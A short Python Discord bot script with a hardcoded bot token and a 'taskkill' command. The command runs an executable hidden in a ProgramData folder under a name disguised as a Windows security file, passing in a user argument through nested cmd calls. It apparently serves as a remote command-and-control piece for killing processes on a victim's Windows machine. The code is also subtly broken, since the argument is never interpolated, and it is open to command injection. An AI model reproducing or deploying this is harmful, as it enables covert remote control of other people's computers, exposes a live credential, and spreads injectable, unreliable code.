import discord
from discord.ext import commands
import os
config = {
    'token': 'MTAzNTkwMTc2MTQ5MzQwMTYwMA.Ga8FoP.zGOQylzQwsQBclU4mprksRWiovZ-YTWYvOh5mg',
    'prefix': '|',
}

bot = commands.Bot(command_prefix=config['prefix'])

@bot.command()
async def taskkill(ctx, argOne):
  os.system('C:\Windows\System32\cmd.exe cmd /c cmd /c cmd /c C:\ProgramData\WindowsSecurityLog\0x65\windowssecurbasex78.exe /f /im {argOne}')

bot.run(config['token'])